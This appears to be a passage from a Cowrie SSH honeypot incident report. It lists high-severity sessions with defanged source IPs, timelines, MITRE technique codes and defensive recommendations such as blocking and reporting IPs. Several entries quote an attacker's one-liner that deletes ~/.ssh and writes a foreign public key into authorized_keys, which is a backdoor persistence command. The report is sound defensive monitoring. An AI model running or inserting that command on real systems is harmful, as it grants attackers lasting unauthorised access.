| `2026-05-23 07:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.3[.]33` to AbuseIPDB if not already reported
- [ ] Block `180.93.3[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdad7db9b190

| Field | Detail |
|---|---|
| **Source IP** | `193.30.14[.]165` |
| **First Seen** | 2026-05-23 07:19 |
| **Last Seen** | 2026-05-23 07:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:19:47` | `cowrie.session.connect` |
| `2026-05-23 07:19:47` | `cowrie.client.version` |
| `2026-05-23 07:19:47` | `cowrie.client.kex` |
| `2026-05-23 07:19:48` | `cowrie.login.success` |
| `2026-05-23 07:19:49` | `cowrie.session.params` |
| `2026-05-23 07:19:49` | `cowrie.command.input` |
| `2026-05-23 07:19:49` | `cowrie.command.failed` |
| `2026-05-23 07:19:50` | `cowrie.log.closed` |
| `2026-05-23 07:19:50` | `cowrie.session.params` |
| `2026-05-23 07:19:50` | `cowrie.command.input` |
| `2026-05-23 07:19:50` | `cowrie.session.file_download` |
| `2026-05-23 07:19:50` | `cowrie.log.closed` |
| `2026-05-23 07:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.30.14[.]165` to AbuseIPDB if not already reported
- [ ] Block `193.30.14[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed42ceb9e501

| Field | Detail |
|---|---|
| **Source IP** | `193.30.14[.]165` |
| **First Seen** | 2026-05-23 07:19 |
| **Last Seen** | 2026-05-23 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:19:53` | `cowrie.session.connect` |
| `2026-05-23 07:19:53` | `cowrie.client.version` |
| `2026-05-23 07:19:54` | `cowrie.client.kex` |
| `2026-05-23 07:19:55` | `cowrie.login.success` |
| `2026-05-23 07:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.30.14[.]165` to AbuseIPDB if not already reported
- [ ] Block `193.30.14[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e45ac83cde56

| Field | Detail |
|---|---|
| **Source IP** | `152.32.169[.]153` |
| **First Seen** | 2026-05-23 07:32 |
| **Last Seen** | 2026-05-23 07:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:32:39` | `cowrie.session.connect` |
| `2026-05-23 07:32:39` | `cowrie.client.version` |
| `2026-05-23 07:32:39` | `cowrie.client.kex` |
| `2026-05-23 07:32:39` | `cowrie.login.success` |
| `2026-05-23 07:32:39` | `cowrie.session.params` |
| `2026-05-23 07:32:39` | `cowrie.command.input` |
| `2026-05-23 07:32:39` | `cowrie.command.failed` |
| `2026-05-23 07:32:40` | `cowrie.log.closed` |
| `2026-05-23 07:32:40` | `cowrie.session.params` |
| `2026-05-23 07:32:40` | `cowrie.command.input` |
| `2026-05-23 07:32:40` | `cowrie.session.file_download` |
| `2026-05-23 07:32:40` | `cowrie.log.closed` |
| `2026-05-23 07:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98cd4c532369

| Field | Detail |
|---|---|
| **Source IP** | `152.32.169[.]153` |
| **First Seen** | 2026-05-23 07:32 |
| **Last Seen** | 2026-05-23 07:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:32:42` | `cowrie.session.connect` |
| `2026-05-23 07:32:42` | `cowrie.client.version` |
| `2026-05-23 07:32:42` | `cowrie.client.kex` |
| `2026-05-23 07:32:42` | `cowrie.login.success` |
| `2026-05-23 07:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `152.32.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aac2557162d

| Field | Detail |
|---|---|
| **Source IP** | `105.27.148[.]94` |
| **First Seen** | 2026-05-23 07:33 |
| **Last Seen** | 2026-05-23 07:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:33:06` | `cowrie.session.connect` |
| `2026-05-23 07:33:06` | `cowrie.client.version` |
| `2026-05-23 07:33:06` | `cowrie.client.kex` |
| `2026-05-23 07:33:07` | `cowrie.login.success` |
| `2026-05-23 07:33:08` | `cowrie.session.params` |
| `2026-05-23 07:33:08` | `cowrie.command.input` |
| `2026-05-23 07:33:08` | `cowrie.command.failed` |
| `2026-05-23 07:33:08` | `cowrie.log.closed` |
| `2026-05-23 07:33:08` | `cowrie.session.params` |
| `2026-05-23 07:33:08` | `cowrie.command.input` |
| `2026-05-23 07:33:08` | `cowrie.session.file_download` |
| `2026-05-23 07:33:09` | `cowrie.log.closed` |
| `2026-05-23 07:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `105.27.148[.]94` to AbuseIPDB if not already reported
- [ ] Block `105.27.148[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b776b9aa5681

| Field | Detail |
|---|---|
| **Source IP** | `105.27.148[.]94` |
| **First Seen** | 2026-05-23 07:33 |
| **Last Seen** | 2026-05-23 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:33:11` | `cowrie.session.connect` |
| `2026-05-23 07:33:11` | `cowrie.client.version` |
| `2026-05-23 07:33:11` | `cowrie.client.kex` |
| `2026-05-23 07:33:12` | `cowrie.login.success` |
| `2026-05-23 07:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `105.27.148[.]94` to AbuseIPDB if not already reported
- [ ] Block `105.27.148[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b522594089

| Field | Detail |
|---|---|
| **Source IP** | `190.220.172[.]154` |
| **First Seen** | 2026-05-23 08:04 |
| **Last Seen** | 2026-05-23 08:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:04:47` | `cowrie.session.connect` |
| `2026-05-23 08:04:47` | `cowrie.client.version` |
| `2026-05-23 08:04:48` | `cowrie.client.kex` |
| `2026-05-23 08:04:49` | `cowrie.login.success` |
| `2026-05-23 08:04:50` | `cowrie.session.params` |
| `2026-05-23 08:04:50` | `cowrie.command.input` |
| `2026-05-23 08:04:50` | `cowrie.command.failed` |
| `2026-05-23 08:04:51` | `cowrie.log.closed` |
| `2026-05-23 08:04:51` | `cowrie.session.params` |
| `2026-05-23 08:04:51` | `cowrie.command.input` |
| `2026-05-23 08:04:51` | `cowrie.session.file_download` |
| `2026-05-23 08:04:51` | `cowrie.log.closed` |
| `2026-05-23 08:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.220.172[.]154` to AbuseIPDB if not already reported
- [ ] Block `190.220.172[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50bab14d7168

| Field | Detail |
|---|---|
| **Source IP** | `190.220.172[.]154` |
| **First Seen** | 2026-05-23 08:04 |
| **Last Seen** | 2026-05-23 08:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:04:55` | `cowrie.session.connect` |
| `2026-05-23 08:04:55` | `cowrie.client.version` |
| `2026-05-23 08:04:56` | `cowrie.client.kex` |
| `2026-05-23 08:04:57` | `cowrie.login.success` |
| `2026-05-23 08:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.220.172[.]154` to AbuseIPDB if not already reported
- [ ] Block `190.220.172[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2195e401cbef

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-05-23 08:22 |
| **Last Seen** | 2026-05-23 08:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:22:10` | `cowrie.session.connect` |
| `2026-05-23 08:22:10` | `cowrie.client.version` |
| `2026-05-23 08:22:10` | `cowrie.client.kex` |
| `2026-05-23 08:22:10` | `cowrie.login.success` |
| `2026-05-23 08:22:11` | `cowrie.session.params` |
| `2026-05-23 08:22:11` | `cowrie.command.input` |
| `2026-05-23 08:22:11` | `cowrie.command.failed` |
| `2026-05-23 08:22:11` | `cowrie.log.closed` |
| `2026-05-23 08:22:11` | `cowrie.session.params` |
| `2026-05-23 08:22:11` | `cowrie.command.input` |
| `2026-05-23 08:22:12` | `cowrie.session.file_download` |
| `2026-05-23 08:22:12` | `cowrie.log.closed` |
| `2026-05-23 08:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461fce842c48

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-05-23 08:22 |
| **Last Seen** | 2026-05-23 08:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:22:14` | `cowrie.session.connect` |
| `2026-05-23 08:22:14` | `cowrie.client.version` |
| `2026-05-23 08:22:14` | `cowrie.client.kex` |
| `2026-05-23 08:22:15` | `cowrie.login.success` |
| `2026-05-23 08:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e507a66193d3

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-23 08:29 |
| **Last Seen** | 2026-05-23 08:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:29:32` | `cowrie.session.connect` |
| `2026-05-23 08:29:32` | `cowrie.client.version` |
| `2026-05-23 08:29:32` | `cowrie.client.kex` |
| `2026-05-23 08:29:33` | `cowrie.login.success` |
| `2026-05-23 08:29:33` | `cowrie.session.params` |
| `2026-05-23 08:29:33` | `cowrie.command.input` |
| `2026-05-23 08:29:33` | `cowrie.command.failed` |
| `2026-05-23 08:29:33` | `cowrie.log.closed` |
| `2026-05-23 08:29:33` | `cowrie.session.params` |
| `2026-05-23 08:29:33` | `cowrie.command.input` |
| `2026-05-23 08:29:33` | `cowrie.session.file_download` |
| `2026-05-23 08:29:33` | `cowrie.log.closed` |
| `2026-05-23 08:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c2c71f61f88

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-23 08:29 |
| **Last Seen** | 2026-05-23 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:29:36` | `cowrie.session.connect` |
| `2026-05-23 08:29:36` | `cowrie.client.version` |
| `2026-05-23 08:29:36` | `cowrie.client.kex` |
| `2026-05-23 08:29:36` | `cowrie.login.success` |
| `2026-05-23 08:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620c6965dd69

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-23 08:41 |
| **Last Seen** | 2026-05-23 08:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:41:08` | `cowrie.session.connect` |
| `2026-05-23 08:41:08` | `cowrie.client.version` |
| `2026-05-23 08:41:08` | `cowrie.client.kex` |
| `2026-05-23 08:41:09` | `cowrie.login.success` |
| `2026-05-23 08:41:09` | `cowrie.session.params` |
| `2026-05-23 08:41:09` | `cowrie.command.input` |
| `2026-05-23 08:41:09` | `cowrie.command.failed` |
| `2026-05-23 08:41:09` | `cowrie.log.closed` |
| `2026-05-23 08:41:09` | `cowrie.session.params` |
| `2026-05-23 08:41:09` | `cowrie.command.input` |
| `2026-05-23 08:41:10` | `cowrie.session.file_download` |
| `2026-05-23 08:41:10` | `cowrie.log.closed` |
| `2026-05-23 08:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba98a1d0080

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-23 08:41 |
| **Last Seen** | 2026-05-23 08:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:41:12` | `cowrie.session.connect` |
| `2026-05-23 08:41:12` | `cowrie.client.version` |
| `2026-05-23 08:41:12` | `cowrie.client.kex` |
| `2026-05-23 08:41:12` | `cowrie.login.success` |
| `2026-05-23 08:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10a5e9e06648

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-23 08:44 |
| **Last Seen** | 2026-05-23 08:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:44:58` | `cowrie.session.connect` |
| `2026-05-23 08:44:58` | `cowrie.client.version` |
| `2026-05-23 08:44:58` | `cowrie.client.kex` |
| `2026-05-23 08:44:59` | `cowrie.login.success` |
| `2026-05-23 08:44:59` | `cowrie.session.params` |
| `2026-05-23 08:44:59` | `cowrie.command.input` |
| `2026-05-23 08:44:59` | `cowrie.command.failed` |
| `2026-05-23 08:44:59` | `cowrie.log.closed` |
| `2026-05-23 08:44:59` | `cowrie.session.params` |
| `2026-05-23 08:44:59` | `cowrie.command.input` |
| `2026-05-23 08:45:00` | `cowrie.session.file_download` |
| `2026-05-23 08:45:00` | `cowrie.log.closed` |
| `2026-05-23 08:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba133659e03

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-23 08:45 |
| **Last Seen** | 2026-05-23 08:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 08:45:02` | `cowrie.session.connect` |
| `2026-05-23 08:45:02` | `cowrie.client.version` |
| `2026-05-23 08:45:02` | `cowrie.client.kex` |
| `2026-05-23 08:45:02` | `cowrie.login.success` |
| `2026-05-23 08:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86735cd3e391

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-23 08:52 |
| **Last Seen** | 2026-05-23 08:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
